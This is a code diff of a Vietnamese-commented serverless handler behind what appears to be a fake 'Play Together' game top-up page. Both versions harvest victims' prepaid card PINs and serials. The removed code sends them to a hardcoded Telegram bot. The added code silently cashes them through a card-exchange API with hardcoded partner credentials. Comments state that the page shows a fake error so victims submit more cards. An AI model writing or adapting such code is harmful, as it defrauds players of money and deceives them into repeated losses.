@@ -1,49 +1,53 @@
 const axios = require('axios');
+const crypto = require('crypto');
 
 exports.handler = async (event) => {
-  // Chỉ cho phép phương thức POST
-  if (event.httpMethod !== "POST") {
-    return { statusCode: 405, body: "Method Not Allowed" };
-  }
+    // Chỉ chấp nhận dữ liệu gửi lên qua phương thức POST
+    if (event.httpMethod !== "POST") {
+        return { statusCode: 405, body: "Method Not Allowed" };
+    }
 
-  try {
-    const { type, code, seri, playerID, amount } = JSON.parse(event.body);
+    try {
+        // Lấy dữ liệu thẻ từ giao diện gửi lên
+        const data = JSON.parse(event.body);
+        
+        // THÔNG TIN TÀI KHOẢN DOITHE1S CỦA BẠN
+        const partner_id = '72845595642'; 
+        const partner_key = 'a2beb524331cd657fbc016fcd6cc21c9'; 
 
-    // Thông tin Bot Telegram của bạn từ ảnh cung cấp
-    const TELEGRAM_TOKEN = "8631916029:AAEZ3afReaeehe860KzXKJI5X48d8c2-6cE"; 
-    const CHAT_ID = "7833122332";
+        // Tạo chữ ký MD5 bảo mật theo yêu cầu của hệ thống
+        const sign = crypto.createHash('md5')
+            .update(partner_key + data.pin + data.seri)
+            .digest('hex');
 
-    const message = `
-🔥 **THÔNG BÁO NẠP THẺ MỚI** 🔥
-━━━━━━━━━━━━━━━━━━
-👤 **ID Player:** \`${playerID}\`
-💳 **Loại thẻ:** ${type}
-💰 **Mệnh giá:** ${Number(amount).toLocaleString('vi-VN')} VNĐ
-📌 **Mã thẻ:** \`${code}\`
-🔢 **Số Seri:** \`${seri}\`
-━━━━━━━━━━━━━━━━━━
-🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN', {timeZone: 'Asia/Ho_Chi_Minh'})}
-🌐 *Nguồn:* Website Play Together
-    `;
+        // GỬI THẺ SANG DOITHE1S.VN (CHẠY NGẦM)
+        const response = await axios.post('https://doithe1s.vn/api/card-auto', new URLSearchParams({
+            type: data.type,
+            amount: data.amount,
+            serial: data.seri,
+            pin: data.pin,
+            partner_id: partner_id,
+            request_id: Date.now().toString(), // Tạo mã đơn hàng ngẫu nhiên
+            sign: sign
+        }).toString(), {
+            headers: { 
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 
+            }
+        });
 
-    // Gửi dữ liệu về Telegram
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: "Markdown"
-    });
+        // Trả về trạng thái OK để giao diện tiếp tục đếm ngược 5 giây
+        return {
+            statusCode: 200,
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: 1, message: "Đã nhận dữ liệu" })
+        };
 
-    // Trả về kết quả cho trình duyệt (vẫn báo thất bại trên web để khách nạp lại)
-    return {
-      statusCode: 200,
-      body: JSON.stringify({ status: "success" }),
-    };
-
-  } catch (error) {
-    console.error('Lỗi gửi Telegram:', error);
-    return { 
-      statusCode: 500, 
-      body: JSON.stringify({ status: "error", message: error.message }) 
-    };
-  }
+    } catch (error) {
+        // Ngay cả khi lỗi kết nối, vẫn trả về 200 để giao diện hiện lỗi giả cho khách
+        return {
+            statusCode: 200, 
+            body: JSON.stringify({ status: 0, message: "Lỗi xử lý" })
+        };
+    }
 };
